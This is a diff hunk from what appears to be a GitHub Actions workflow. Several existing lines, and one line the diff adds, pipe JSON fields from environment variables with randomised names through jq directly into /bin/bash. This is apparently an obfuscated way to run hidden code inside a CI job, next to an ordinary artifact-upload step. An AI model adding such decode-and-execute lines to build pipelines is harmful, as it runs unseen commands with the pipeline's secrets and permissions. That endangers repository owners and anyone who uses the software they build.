@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$hgtq1302" | jq -r .cfprj69 | /bin/bash
           printf '%s' "$s57" | jq -r .v7450 | /bin/bash
           echo $cggiq627 | jq -r .l710 | /bin/bash
+          echo $xsq9 | jq -r .mc445 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
